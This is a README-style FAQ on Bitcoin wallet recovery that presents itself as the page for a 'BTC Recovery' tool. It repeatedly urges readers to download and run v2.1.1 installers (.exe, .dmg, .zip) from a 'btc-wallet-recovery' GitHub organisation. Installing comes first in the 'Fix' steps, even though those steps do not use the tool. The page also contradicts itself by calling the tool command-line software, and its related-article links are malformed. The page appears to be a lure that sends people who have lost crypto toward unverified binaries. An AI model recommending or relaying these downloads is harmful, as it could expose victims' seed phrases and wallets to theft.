<div align="center">
<img src="assets/banner-article.png" alt="Wallet recovery FAQ">
</div>

# Wallet recovery FAQ

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

The questions that come up before anything else: what can be recovered, what cannot, which artifact decides it, and where each route starts. Short answers here, with the page that carries the steps.

## You'll see this if

You have a wallet problem and no idea which of the forty possible causes it is. Start with the artifact, then read the answer that matches.

| What you have | What it decides | Read |
|---|---|---|
| A phrase, complete | a restore, not a recovery | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| A phrase, incomplete | a bounded search | [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) |
| An encrypted file | a password search | [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) |
| Both phrase and file | use the phrase | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| Neither | nothing to search | [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) |
| A wallet the tool does not target | the app's own restore | [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) |

## Why it happens

Almost every confusing recovery question resolves to one distinction: what the artifact is. A phrase regenerates keys; a password unlocks a file; a private key controls one address; an account belongs to someone else. Each of those four has exactly one route, and mixing them is what produces a week of wrong searches.

A third distinction is time. A wallet made in 2013 may need an older format to open, while the same phrase may restore perfectly in a current app  -  so 'the software will not open it' and 'the phrase will not restore it' are separate findings, and reporting one as the other sends people down the wrong route entirely. Naming which of the two failed is the most useful thing a reader can do before asking for help.

The second distinction is custody. If a company holds the keys, no local tool applies and the provider's process is the only route. If you hold them, the phrase or the file is the recovery  -  and if neither survives, the answer is a boundary rather than a technique.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Answer in order, and stop at the first line that matches.

1. **Do you hold the keys?** If not, this is an account problem, not a wallet one.
2. **Do you have a phrase?** Complete means restore; partial means search.
3. **Do you have a file?** Then the question is its type, then its password.
4. **Do you have a key?** One address, no phrase needed, and no wallet to restore.
5. **Do you have an address only?** Nothing derives from it  -  an address is a destination, not a key.
6. **Do you have nothing?** Read the boundary page before spending money on help.

The order matters more than any individual step. People commonly begin at a password or phrase search because it feels like action, then discover the artifact was an account or a different wallet type. Ten minutes on custody and identification saves the evening a premature search consumes, and it costs nothing but attention.

Two rows deserve a warning because they are where money is lost. "Neither" is the answer people refuse to accept, and it is the one paid offers cluster around: no payment recovers keys that were never written down, and the offers that arrive after a loss are usually the second theft. "A wallet the tool does not target" is the quiet one  -  people run searches against files nothing can read and conclude their password is wrong, when the file was never readable at all. Checking the artifact takes a minute and prevents both.

## If that did not work

If none of the rows fit, the artifact is probably not what it appears: a backup of a service that no longer exists, a printout of something that was never a seed, an app export in a private format. Identification comes next, not recovery: the file name, word count and address format all narrow the family.

And if a route fits but produced nothing, the failure is diagnosable rather than final: [A recovery run that finds nothing: what to check](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-recovery-failed-what-now.md).

## Prevention

- Keep one note listing every wallet, year, address and backup location.
- Test a restore before funding anything.
- Store phrases offline, in two places, never digitally.
- Verify any recovery tool from its release page before running it: [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md).
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

One habit covers most of this page: write down what each backup is while you still remember. A phrase with no label is a puzzle in five years, and a file called `backup.dat` is a puzzle in two. The label costs one line and removes the first three questions here permanently.

Keep this note somewhere you would look under stress: a will folder, a safe, a manager entry that names wallets without containing phrases. The person who needs it may not be you; an executor following a list is a very different reader from the owner who remembers the folder name.

## FAQ

### Can lost Bitcoin be recovered?

Only when something that produces the keys survives  -  a phrase, a file, a key. Nothing recovers coins whose keys are gone, and no service changes that.

### What is the difference between a wallet password and a seed phrase?

A password unlocks a file that sits on your disk; a phrase regenerates the wallet itself. Losing one is a different problem from losing the other, and only the password is searchable in the same way.

### Why does my phrase restore an empty wallet?

Because the wallet type, account, address type or a BIP39 passphrase differs from the original. Compare the first address rather than the balance: [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md).

### Can a recovery tool run on a phone?

The tool itself is command-line software for a computer. A phone can hold the wallet and the phrase, but the search belongs on a machine you control, offline.

### Is it worth paying a recovery service?

Only after you know what artifact you hold. For a local file or phrase, the free local route is the same work at no cost, and no service needs a phrase to help you  -  a request for one is the end of the conversation.

### Where do I start if I have several old wallets?

Image the drive, list the files, identify the types, then work one at a time: a run per file.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
- [Can lost Bitcoin be recovered?]([Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md))
- [Wallets and files BTCRecover does not target]([Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md))
